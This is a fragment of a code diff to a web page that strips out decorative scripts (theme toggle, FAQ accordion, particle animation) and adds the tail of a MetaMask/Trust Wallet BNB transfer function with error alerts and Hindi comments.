-            themeToggle.querySelector('span').textContent = document.body.classList.contains('dark') ? 'light_mode' : 'dark_mode';
-        });
-
-        // FAQ Accordion
-        document.querySelectorAll('.faq-toggle').forEach(toggle => {
-            toggle.addEventListener('click', () => {
-                const content = toggle.nextElementSibling;
-                content.classList.toggle('hidden');
-                toggle.querySelector('span').textContent = content.classList.contains('hidden') ? 'expand_more' : 'expand_less';
-            });
-        });
-
-        // Particle Animation
-        const canvas = document.getElementById('particle-canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        const particles = [];
-        for (let i = 0; i < 50; i++) {
-            particles.push({
-                x: Math.random() * canvas.width,
-                y: Math.random() * canvas.height,
-                radius: Math.random() * 3 + 1,
-                vx: Math.random() * 0.5 - 0.25,
-                vy: Math.random() * 0.5 - 0.25
-            });
+          alert("BNB sent! Tx hash: " + tx.transactionHash);
+        } catch (err) {
+          console.error("Error:", err); // आपके मूल कोड के अनुसार सरल एरर लॉगिंग
+          // उपयोगकर्ता को थोड़ी और जानकारी देने के लिए एक सरल अलर्ट
+          if (err.code === 4001) { // EIP-1193 user rejected error
+            alert("Transaction rejected by user.");
+          } else if (err.message.toLowerCase().includes("insufficient funds")) {
+            alert("Error: Insufficient funds for transaction.");
+          } else {
+            alert("An error occurred: " + err.message);
+          }
         }
-        function animateParticles() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            particles.forEach(p => {
-                p.x += p.vx;
-                p.y += p.vy;
-                if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
-                if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
-                ctx.fill();
-            });
-            requestAnimationFrame(animateParticles);
-        }
-        animateParticles();
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
+      } else {
+        alert("Please install MetaMask or Trust Wallet (or use the DApp browser in Trust Wallet).");
+      }
+    }
+  </script>
 
-        // Form Submission (Placeholder)
-        document.querySelector('form').addEventListener('submit', e => {
-            e.preventDefault();
-            alert('Form submitted! (This is a placeholder action.)');
-        });
-
-        // Wallet Connect and BNB Transfer
-        const Web3 = window.Web3;
-        const WalletConnectProvider = window.WalletConnectProvider.default;
-
-        const receiverAddress = "0x1234567890abcdef..."; // Yahan apna destination wallet add
+</body>
+</html>
